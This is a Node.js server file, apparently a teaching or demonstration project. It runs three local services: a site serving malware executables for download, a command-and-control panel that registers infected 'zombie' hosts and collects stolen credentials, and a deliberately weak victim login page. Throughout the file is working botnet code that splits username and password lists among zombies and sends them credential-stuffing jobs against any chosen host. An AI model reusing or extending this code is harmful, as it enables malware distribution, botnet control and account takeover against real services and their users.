const express = require("express");
const getPort = require("get-port");
const open = require("open");
const app = express();
const path = require("path");
const http = require("http");
const server = http.createServer(app);
const io = require("socket.io")(server);
const axios = require("axios");

let zombies = [];
let credentials = [];



const initDownloadSite = async() => {
    const port = await getPort({ port: 8000 }); //find an availble port (default 8000)
    const host = `http://127.0.0.1:${port}`;


    app.get("/files/:file(*)", function(req, res, next) { //serve malware executables
        var filePath = path.join(__dirname, "/malware/build/", req.params.file);
        if (
            req.params.file === "malware-linux" ||
            req.params.file === "malware-macos"
        ) {
            res.set("Content-Type", "application/x-elf");
        } else {
            res.set("Content-Type", "application/x-msdownload");
        }

        res.download(filePath, function(err) {
            if (!err) return; // file sent
            if (err.status !== 404) return next(err); // non-404 error
            // file for download not found
            res.statusCode = 404;
            res.send("Cant find that file, sorry!");
        });
    });

    app.get("/", function(req, res) {
        res.sendFile(path.join(__dirname + "/index.html"));
    });

    app.listen(port, async() => {
        await open(`${host}/`);
    });
    console.log(`Downloads site running on port ${port}`);
}

const initCommandAndControl = async() => {
    app.use(
        "/command.js",
        express.static(path.join(__dirname, "/controls/command.js"))
    );
    const port = await getPort({ port: 3001 });
    const host = `http://127.0.0.1:${port}`;
    if (port != 3001) {
        console.log(
            "ERROR, port 3001 is occupied. Port 3001 is required for this project to run successfully"
        );
        return;
    }
    app.get("/command", function(req, res) {
        res.sendFile(path.join(__dirname, "/controls/command.html"));
    });

    app.use(express.json());
    app.post("/new-victim", function(req, res) {
        const hostname = req.body.host;
        zombies.push(hostname);
        io.emit("new-victim", hostname);
        console.log(`New victim connected, Host: ${hostname}`);
        res.sendStatus(200);
    });

    app.post("/valid-credentials", function(req, res) {
        const { username, password } = req.body;
        credentials.push({ username, password });
        io.emit("credentials", { username, password });
        console.log(`Recieved valid credentials ${username} ${password}`);
        res.sendStatus(200);
    })

    app.post("/run-attack", function(req, res) {
        let { host, endpoint, delay, usernames, passwords } = req.body;
        console.log(
            "PREPAIRING ATTACK ",
            host,
            endpoint,
            delay,
            usernames,
            passwords,
            zombies
        );
        if (zombies.length < 1) {
            res.sendStatus(500);
        } else {
            res.sendStatus(200);
            sendAttackToZombies(req.body);
        }
    });

    io.on("connection", (socket) => {
        console.log("command and control socket connection established");
    });

    server.listen(port, async() => {
        await open(`${host}/command`);
    });
    console.log(`Command and control running on port ${port}`);
};

const initVictim = async() => {
    app.use(
        "/login.js",
        express.static(path.join(__dirname, "/victim/login.js"))
    );
    const port = await getPort({ port: 3002 });
    const host = `http://127.0.0.1:${port}`;
    if (port != 3002) {
        console.log(
            "ERROR, port 3002 is occupied. Port 3002 is required for this project to run successfully"
        );
        return;
    }

    app.get("/login", function(req, res) {
        res.sendFile(path.join(__dirname, "/victim/login.html"));
    });

    app.get("/admin.html", function(req, res) {
        res.sendFile(path.join(__dirname, "/victim/admin.html"));
    });

    app.post("/authenticate", function(req, res) {
        console.log(`Attempt received, ${JSON.stringify(req.body)}`);
        const username = req.body.username;
        const password = req.body.password;
        if (username === "admin" && password == "password") {
            res.redirect("/admin.html");
        } else {
            res.sendStatus(401);
        }
    });

    app.listen(port, async() => {
        await open(`${host}/login`);
    });

    console.log(`Victim running on port ${port}`);
};

const sendAttackToZombies = (data) => {
    let { host, endpoint, delay, usernames, passwords } = data;
    let usernamesPerZombie = Math.floor(usernames.length / zombies.length);
    if (usernamesPerZombie === 0) {
        usernamesPerZombie = 1;
    }

    zombies.forEach((zombie, i) => {
        let usernameCount = 0;
        let zombieUsernames = [];
        //create array of usernames for this zombie to use
        while (usernameCount < usernamesPerZombie && usernames.length > 0) {
            zombieUsernames.push(usernames.pop());
            usernameCount += 1;
        }
        if (i === zombies.length - 1 && usernames.length > 0) {
            while (usernames.length > 0) {
                zombieUsernames.push(usernames.pop());
            }
        }

        //only send the request if there are usernames
        if (zombieUsernames.length > 0) {
            const data = {
                host,
                endpoint,
                delay,
                usernames: zombieUsernames,
                passwords: passwords,
            };
            axios
                .post(`${zombie}/credential-stuffing`, JSON.stringify(data), {
                    headers: {
                        "Content-Type": "application/json",
                    },
                })
                .then((res) => {

                    // console.log(res);
                })
                .catch((err) => {
                    console.error(err);
                });
        }
    });
};

(async function() {
    await initDownloadSite();
    await initCommandAndControl();
    await initVictim();
})();